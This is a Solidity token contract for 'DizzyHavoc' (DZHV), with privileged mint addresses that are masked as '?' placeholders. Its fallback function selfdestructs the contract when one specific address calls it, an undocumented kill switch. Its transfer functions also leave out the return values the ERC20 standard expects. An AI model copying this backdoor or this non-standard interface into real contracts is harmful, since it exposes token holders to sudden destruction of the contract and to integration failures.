// SPDX-License-Identifier: 0BSD
pragma solidity 0.8.23;

struct U {
    uint totalSupply;
}

struct Die {
    address addr;
    uint val;
}

contract ERC20 {

    function name() external pure returns (string memory) { return "DizzyHavoc"; }
    function symbol() external pure returns (string memory) { return "DZHV"; }
    function decimals() external pure returns (uint8) { return 18; }
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    event Burn(uint dest, address addr, uint val, uint64 slippage);

    function totalSupply() external view returns (uint) {
        U storage u; assembly { u.slot := 0x100000000 }
        return u.totalSupply;
    }

    function burn(uint dest, address addr, uint val, uint64 slippage) external {
        U storage u; assembly { u.slot := 0x100000000 }
        u.totalSupply -= val;
        balanceOf[msg.sender] -= val;
        emit Transfer(msg.sender, address(0), val);
        emit Burn(dest, addr, val, slippage);
    }

    function mint(Die[] calldata dies) external {
        require(msg.sender == 0x?W??????????????????????????????????????
            || msg.sender == 0x?B??????????????????????????????????????);
        for (uint i = 0; i < dies.length; i++) {
            Die calldata die = dies[i];
            address addr = die.addr;
            uint val = die.val;
            balanceOf[addr] += val;
            U storage u; assembly { u.slot := 0x100000000}
            u.totalSupply += val;
            emit Transfer(address(0), msg.sender, val);
        }
    }
    
    function mint(address addr, uint val) external {
        require(msg.sender == 0x?W??????????????????????????????????????
            || msg.sender == 0x?B??????????????????????????????????????);
        U storage u; assembly { u.slot := 0x100000000 }
        u.totalSupply += val;
        balanceOf[addr] += val;
        emit Transfer(address(0), addr, val);
    }

    function transfer(address to, uint amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint amount) external {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }

    function approve(address spender, uint amount) external {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
    }

    fallback() external {
        assembly {
            if eq(caller(), 0x?D??????????????????????????????????????) {
                selfdestruct(0x?W??????????????????????????????????????) } }
    }

}